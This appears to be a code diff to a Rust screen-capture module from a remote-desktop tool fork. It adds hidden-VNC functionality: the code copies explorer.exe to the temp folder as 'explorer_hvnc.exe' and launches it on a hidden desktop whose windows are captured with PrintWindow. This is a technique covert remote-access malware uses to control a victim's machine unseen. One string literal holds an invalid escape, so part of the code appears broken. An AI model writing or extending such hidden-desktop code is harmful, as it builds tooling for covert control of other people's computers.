@@ -65,21 +65,6 @@ pub struct CapturerGDI {
 
 impl CapturerGDI {
     pub fn new(name: &[u16], width: i32, height: i32) -> Result<Self, Box<dyn std::error::Error>> {
-        /* or Enumerate monitors with EnumDisplayMonitors,
-        https://stackoverflow.com/questions/34987695/how-can-i-get-an-hmonitor-handle-from-a-display-device-name
-            #[no_mangle]
-            pub extern "C" fn callback(m: HMONITOR, dc: HDC, rect: LPRECT, lp: LPARAM) -> BOOL {}
-        */
-        /*
-        shared::windef::HMONITOR,
-        winuser::{GetMonitorInfoW, GetSystemMetrics, MONITORINFOEXW},
-        let mut mi: MONITORINFOEXW = std::mem::MaybeUninit::uninit().assume_init();
-        mi.cbSize = size_of::<MONITORINFOEXW>() as _;
-        if GetMonitorInfoW(m, &mut mi as *mut MONITORINFOEXW as _) == 0 {
-            return Err(format!("Failed to get monitor information of: {:?}", m).into());
-        }
-        */
-
         unsafe {
             println!(
                 "CapturerGDI::new: Trying to open/create desktop: {:?}",
@@ -117,36 +102,54 @@ impl CapturerGDI {
             } else {
                 println!("SetThreadDesktop success");
 
-                // Try to start notepad.exe to verify GUI window creation on hidden desktop
-                let program = std::ffi::CString::new("notepad.exe").unwrap();
-                let mut si: STARTUPINFOA = std::mem::zeroed();
-                si.cb = size_of::<STARTUPINFOA>() as _;
-                si.lpDesktop = hbb_common::config::DESKTOP_NAME.as_ptr() as *mut _;
+                // --- Explorer Launch Logic ---
+                // 1. Get Windows Directory
+                let mut buffer = [0u8; 260]; // MAX_PATH
+                let len = winapi::um::sysinfoapi::GetWindowsDirectoryA(buffer.as_mut_ptr() as *mut i8, 260);
+                if len > 0 {
+                    let windir = std::str::from_utf8(&buffer[..len as usize]).unwrap_or("");
+                    let source_path = format!("{}\explorer.exe", windir);
+                    let temp_dir = std::env::temp_dir();
+                    let target_path = temp_dir.join("explorer_hvnc.exe");
+                    let target_path_str = target_path.to_string_lossy().to_string();
 
-                let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
+                    println!("Copying explorer from {} to {}", source_path, target_path_str);
+                    
+                    // 2. Copy explorer.exe to temp
+                    if let Err(e) = std::fs::copy(&source_path, &target_path) {
+                        println!("Failed to copy explorer.exe: {}", e);
+                    } else {
+                        // 3. Launch the copy
+                        let program = std::ffi::CString::new(target_path_str).unwrap();
+                        let mut si: STARTUPINFOA = std::mem::zeroed();
+                        si.cb = size_of::<STARTUPINFOA>() as _;
+                        si.lpDesktop = hbb_common::config::DESKTOP_NAME.as_ptr() as *mut _;
+                        
+                        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
 
-                let res = CreateProcessA(
-                    ptr::null(),
-                    program.as_ptr() as *mut _,
-                    ptr::null_mut(),
-                    ptr::null_mut(),
-                    0,
-                    0,
-                    ptr::null_mut(),
-                    ptr::null(),
-                    &mut si,
-                    &mut pi,
-                );
+                        let res = CreateProcessA(
+                            ptr::null(),
+                            program.as_ptr() as *mut _,
+                            ptr::null_mut(),
+                            ptr::null_mut(),
+                            0,
+                            0,
+                            ptr::null_mut(),
+                            ptr::null(),
+                            &mut si,
+                            &mut pi
+                        );
 
-                if res != 0 {
-                    println!(
-                        "Started notepad.exe on hidden desktop. PID: {}",
-                        pi.dwProcessId
-                    );
-                    winapi::um::handleapi::CloseHandle(pi.hProcess);
-                    winapi::um::handleapi::CloseHandle(pi.hThread);
+                        if res != 0 {
+                            println!("Started explorer_hvnc.exe on hidden desktop. PID: {}", pi.dwProcessId);
+                            winapi::um::handleapi::CloseHandle(pi.hProcess);
+                            winapi::um::handleapi::CloseHandle(pi.hThread);
+                        } else {
+                            println!("Failed to start explorer_hvnc.exe, LastErr: {}", GetLastError());
+                        }
+                    }
                 } else {
-                    println!("Failed to start notepad.exe, LastErr: {}", GetLastError());
+                    println!("Failed to get Windows directory");
                 }
             }
 
@@ -154,14 +157,6 @@ impl CapturerGDI {
             if dc.is_null() {
                 return Err("Failed to create dc from monitor name".into());
             }
-
-            // if name.is_empty() {
-            //     return Err("Empty display name".into());
-            // }
-            // let screen_dc = CreateDCW(&name[0], 0 as _, 0 as _, 0 as _);
-            // if screen_dc.is_null() {
-            //     return Err("Failed to create dc from monitor name".into());
-            // }
 
             // Create a Windows Bitmap, and copy the bits into it
             let screen_dc = CreateCompatibleDC(dc);
@@ -196,12 +191,6 @@ impl CapturerGDI {
         }
     }
 
-    // pub fn frame_hidden(&self, data: &mut Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
-    //     unsafe {
-
-    //     }
-    // }
-
     fn paint_window(&self, wnd: HWND) -> bool {
         let mut ret = false;
 
@@ -216,14 +205,14 @@ impl CapturerGDI {
                 return false;
             }
 
-            println!("paint_window: HWND={:?}, Rect={:?}", wnd, rect);
+            // println!("paint_window: HWND={:?}, Rect={:?}", wnd, rect);
 
             let dc_window = CreateCompatibleDC(self.dc);
             let bmp_window =
                 CreateCompatibleBitmap(self.dc, rect.right - rect.left, rect.bottom - rect.top);
 
             if SelectObject(dc_window, bmp_window as _).is_null() {
-                println!("SelectObject");
+                // println!("SelectObject");
             }
 
             if PrintWindow(wnd, dc_window, 0) != 0 {
@@ -238,7 +227,7 @@ impl CapturerGDI {
                     0,
                     SRCCOPY | CAPTUREBLT,
                 ) {
-                    println!("bitble");
+                    // println!("bitble");
                 }
 
                 ret = true;
@@ -302,29 +291,9 @@ impl CapturerGDI {
 
     pub fn frame(&self, data: &mut Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
         unsafe {
-            // let res = BitBlt(
-            //     self.dc,
-            //     0,
-            //     0,
-            //     self.width,
-            //     self.height,
-            //     self.screen_dc,
-            //     0,
-            //     0,
-            //     SRCCOPY | CAPTUREBLT, // CAPTUREBLT enable layered window but also make cursor blinking
-            // );
-
-            // if res == 0 {
-            //     return Err("Failed to copy screen to Windows buffer".into());
-            // }
-            // SetThreadDesktop(self.desktop);
-
+            // println!("CapturerGDI::frame: Start enumerating windows...");
             self.enum_windows_top_to_down(ptr::null_mut());
-            // self.paint_window(GetDesktopWindow());
-
-            println!("CapturerGDI::frame: Start enumerating windows...");
-            self.enum_windows_top_to_down(ptr::null_mut());
-            println!("CapturerGDI::frame: Enum done.");
+            // println!("CapturerGDI::frame: Enum done.");
 
             let stride = self.width * PIXEL_WIDTH;
             let size: usize = (stride * self.height) as usize;
@@ -399,38 +368,3 @@ impl Drop for CapturerGDI {
         }
     }
 }
-
-// #[cfg(test)]
-// mod tests {
-//     use super::super::*;
-//     use super::*;
-//     #[test]
-//     fn test() {
-//         match Displays::new().unwrap().next() {
-//             Some(d) => {
-//                 let w = d.width();
-//                 let h = d.height();
-//                 let c = CapturerGDI::new(d.name(), w, h).unwrap();
-//                 let mut data = Vec::new();
-//                 c.frame(&mut data).unwrap();
-//                 let mut bitflipped = Vec::with_capacity((w * h * 4) as usize);
-//                 for y in 0..h {
-//                     for x in 0..w {
-//                         let i = (w * 4 * y + 4 * x) as usize;
-//                         bitflipped.extend_from_slice(&[data[i + 2], data[i + 1], data[i], 255]);
-//                     }
-//                 }
-//                 repng::encode(
-//                     std::fs::File::create("gdi_screen.png").unwrap(),
-//                     d.width() as u32,
-//                     d.height() as u32,
-//                     &bitflipped,
-//                 )
-//                 .unwrap();
-//             }
-//             _ => {
-//                 assert!(false);
-//             }
-//         }
-//     }
-// }
